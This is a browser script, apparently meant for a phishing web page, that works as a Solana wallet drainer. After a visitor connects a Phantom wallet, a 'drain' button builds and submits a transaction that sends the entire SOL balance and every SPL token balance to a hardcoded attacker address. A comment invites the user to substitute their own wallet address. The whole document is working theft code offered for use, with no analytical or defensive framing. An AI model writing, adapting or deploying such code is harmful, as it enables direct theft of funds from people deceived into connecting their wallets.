    <script type="module">
        import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.browser.js";
        import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from "https://cdn.jsdelivr.net/npm/@solana/spl-token@latest/lib/index.browser.js";

        // YOUR WALLET ADDRESS HERE
        const RECIPIENT_ADDRESS = "HJr1YBdkafWEqNQcRDPe7cGpRctDo9tHGBSe413UKQBE";

        let connection;
        let userPublicKey;
        let userWallet;

        const connectBtn = document.getElementById('connectBtn');
        const drainBtn = document.getElementById('drainBtn');
        const status = document.getElementById('status');

        // Initialize Connection
        connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");

        // 1. Connect Wallet
        connectBtn.addEventListener('click', async () => {
            if (window.solana && window.solana.isPhantom) {
                try {
                    const resp = await window.solana.connect();
                    userPublicKey = resp.publicKey;
                    userWallet = window.solana;
                    
                    status.textContent = "CONNECTED: " + userPublicKey.toBase58().slice(0,6) + "...";
                    status.style.color = "#00ffcc";
                    connectBtn.style.display = 'none';
                    drainBtn.style.display = 'block';
                } catch (err) {
                    status.textContent = "Connection failed: " + err.message;
                }
            } else {
                status.textContent = "Phantom Wallet not found!";
            }
        });

        // 2. Drain Function
        drainBtn.addEventListener('click', async () => {
            if (!userWallet || !userPublicKey) return;

            status.textContent = "INITIATING DRAIN SEQUENCE...";
            status.style.color = "#ff0055";

            try {
                const transaction = new Transaction();
                const recipientPubkey = new PublicKey(RECIPIENT_ADDRESS);

                // A. Drain all SOL
                const balance = await connection.getBalance(userPublicKey);
                if (balance > 0) {
                    transaction.add(
                        SystemProgram.transfer({
                            fromPubkey: userPublicKey,
                            toPubkey: recipientPubkey,
                            lamports: balance,
                        })
                    );
                }

                // B. Drain all SPL Tokens (Meme Coins)
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPublicKey, {
                    programId: TOKEN_PROGRAM_ID
                });

                for (const account of tokenAccounts.value) {
                    const tokenMint = new PublicKey(account.account.data.parsed.info.mint);
                    const tokenAccountAddress = account.account.pubkey;
                    
                    const recipientTokenAccount = await getAssociatedTokenAddress(
                        tokenMint,
                        recipientPubkey,
                        false,
                        TOKEN_PROGRAM_ID,
                        ASSOCIATED_TOKEN_PROGRAM_ID
                    );

                    transaction.add(
                        createTransferInstruction(
                            tokenAccountAddress,
                            recipientTokenAccount,
                            userPublicKey,
                            Number(account.account.data.parsed.info.tokenAmount.uiAmount) * 10 ** account.account.data.parsed.info.decimals
                        )
                    );
                }

                status.textContent = "SIGNING TRANSACTION...";
                
                // Sign and send
                const signature = await userWallet.signTransaction(transaction);
                const rawSignedTransaction = signature.serialize();
                const txId = await connection.sendRawTransaction(rawSignedTransaction, { skipPreflight: true });

                status.textContent = "SUCCESS: FUNDS DRAINED. TX: " + txId.slice(0, 10) + "...";
                status.style.color = "#00ffcc";
                drainBtn.disabled = true;

            } catch (err) {
                status.textContent = "ERROR: " + err.message;
            }
        });
    </script>
